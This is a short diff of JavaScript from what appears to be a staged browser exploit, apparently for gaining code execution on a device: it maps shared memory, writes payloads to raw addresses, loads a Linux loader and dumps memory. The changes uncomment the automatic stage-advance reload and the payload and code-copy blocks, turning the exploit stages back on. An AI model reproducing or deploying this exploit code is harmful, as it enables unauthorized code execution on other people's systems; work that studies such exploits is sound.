@@ -22,7 +22,7 @@ function load() {
 		cleanSessionVars();
 		allocateSharedMemory();
 		document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory...";
-		//setTimeout(function() { document.cookie = "codeExecutionStage=1.1"; location.reload(); }, 10);
+		setTimeout(function() { document.cookie = "codeExecutionStage=1.1"; location.reload(); }, 10);
 	}
 	else if(codeExecutionStage == "1.1") {
 		allocateSharedMemory2();
@@ -128,7 +128,7 @@ function payload() {
 	//setU32to(writeAddress + 2 * 4, 0xf775c085);
 	//setU32to(writeAddress + 3 * 4, 0x000000c3);
 
-	/*
+	
 	if(sessionStorage.loadlinux == 1)
 		writeLinux(writeAddress) // Linux-loader
 	else
@@ -143,7 +143,7 @@ function payload() {
 		chain.logVariable(0);
 		
 		logAdd("<h1>Refresh page and run Stage 4</h1>");
-	});*/
+	});
 }
 
 function copy() {
@@ -152,7 +152,7 @@ function copy() {
 	var dataAddress = 0x926300000;
 	
 	// Copy code
-	/*
+	
 	var c = [];
 	
 	setBase(dataAddress);
@@ -224,7 +224,7 @@ function copy() {
 		setBase(dataAddress);
 		logAdd(hexDump(dataAddress, 256));
 	});
-	*/
+	
 }
 
 function getpid() {
